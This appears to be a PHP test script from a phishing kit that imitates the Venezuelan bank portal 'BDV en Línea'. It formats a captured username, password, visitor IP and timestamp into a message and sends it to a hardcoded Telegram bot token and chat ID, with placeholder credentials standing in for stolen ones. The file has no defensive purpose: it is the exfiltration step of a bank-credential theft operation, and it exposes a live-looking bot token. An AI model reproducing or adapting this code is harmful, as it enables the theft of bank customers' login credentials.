<?php
$token = "8080814760:AAFEZS3tJZHNg6zNbPh2JNFSLXNccRSElYQ";
$chat_id = "6912929677";

// Simular datos del formulario
$usuario = "usuario_prueba";
$password = "clave_prueba";
$ip = $_SERVER['REMOTE_ADDR'];
$fecha = date('Y-m-d H:i:s');

$mensaje = "🏦 ═══ BDV EN LÍNEA ═══ 🏦\n\n";
$mensaje .= "👤 Usuario: $usuario\n";
$mensaje .= "🔑 Clave: $password\n";
$mensaje .= "🌐 IP: $ip\n";
$mensaje .= "📅 Fecha: $fecha\n";
$mensaje .= "\n═══════════════════\n";

$url = "https://api.telegram.org/bot$token/sendMessage";
$data = [
    'chat_id' => $chat_id,
    'text' => $mensaje,
    'parse_mode' => 'HTML'
];

$response = file_get_contents($url . '?' . http_build_query($data));
echo $response;
?> 